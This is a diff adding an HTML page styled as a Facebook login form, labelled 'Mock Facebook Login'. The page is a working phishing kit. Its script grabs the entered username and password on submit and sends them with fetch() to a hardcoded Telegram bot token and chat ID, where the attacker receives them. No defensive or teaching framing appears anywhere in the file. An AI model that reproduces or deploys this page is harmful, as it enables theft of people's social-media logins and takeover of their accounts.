@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mock Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h1 {
+            font-size: 24px;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        .login-container form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .login-container form button {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-container form button:hover {
+            background-color: #145dbf;
+        }
+        .output {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Facebook</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Email or phone number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div id="output" class="output"></div>
+    </div>
+
+    <script>
+        // Telegram bot token and chat ID
+        const telegram_bot_id = '5231603337:AAGjgSiKHgOsz5tLv1ZzHquftzcEGLplrag';
+        const chat_id = '2113595840';
+
+        // Add event listener to handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent page reload
+
+            // Get the values from the form fields
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Send the data to Telegram
+            const message = `Username: ${username}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${telegram_bot_id}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent to Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        });
+    </script>
+</body>
+</html>
